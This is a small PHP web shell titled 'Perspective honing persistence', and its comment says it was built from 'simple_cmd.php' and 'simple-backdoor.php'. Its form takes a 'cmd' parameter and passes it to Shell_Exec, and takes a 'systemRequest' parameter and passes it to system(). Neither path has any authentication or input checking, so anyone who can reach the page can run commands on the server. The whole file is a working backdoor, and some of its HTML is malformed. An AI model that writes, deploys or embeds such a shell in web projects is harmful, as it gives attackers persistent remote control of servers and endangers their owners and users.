<html>
<head>
<title>Perspective honing persistence</title>
// Made from simple_cmd.php, simple-backdoor.php
<body>
<form method=POST>
<input type=TEXT name="cmd" size=64 value="<?=$cmd?>"
<input type=TEXT name="systemRequest" size=64 value="<?=$systemRequest?>"
<hr>
</form>
<?php $cmd = $_REQUEST["cmd"];?>
<?php if ($cmd != "") { print Shell_Exec($cmd); } else { echo "cmd=";}?>
<?php
if(isset($_REQUEST['systemRequest'])){
        echo "<pre>";
        $systemRequest = ($_REQUEST['systemRequest']);
        system($systemRequest);
        echo "</pre>";
        die;
}
?>
</body>
</html>
